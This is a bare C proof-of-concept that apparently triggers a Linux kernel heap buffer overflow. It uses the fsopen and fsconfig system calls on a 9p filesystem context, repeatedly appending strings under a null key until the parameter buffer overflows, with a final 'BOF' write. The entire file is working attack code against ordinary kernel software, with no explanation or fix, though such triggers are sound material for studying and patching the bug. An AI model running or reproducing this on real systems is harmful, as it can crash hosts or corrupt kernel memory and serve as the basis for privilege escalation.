#define _GNU_SOURCE
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

int main(void)
{
  char* key = "HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX";
  int fd = 0;
  fd = fsopen("9p", 0);
  for (int i = 0; i < 116; i++) { 
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", key+1, 0);
  }
  fsconfig(fd, FSCONFIG_SET_STRING, "\x00", key, 0);
  fsconfig(fd, FSCONFIG_SET_STRING, "\x00", "BOF", 0);
  return 0;
}
